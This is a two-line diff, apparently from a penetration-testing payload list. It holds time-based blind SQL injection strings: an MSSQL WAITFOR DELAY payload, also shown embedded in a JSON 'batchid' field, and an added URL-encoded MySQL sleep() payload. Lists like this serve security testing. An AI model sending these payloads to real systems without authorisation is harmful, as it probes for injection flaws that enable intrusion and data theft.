@@ -1,1 +1,2 @@
 ';WAITFOR DELAY '0:0:15'--  # This will wait for 15 seconds eg {"batchid": "';WAITFOR DELAY '0:0:15'--"}
+and%20(select * from (select(sleep(5)))a)--%20
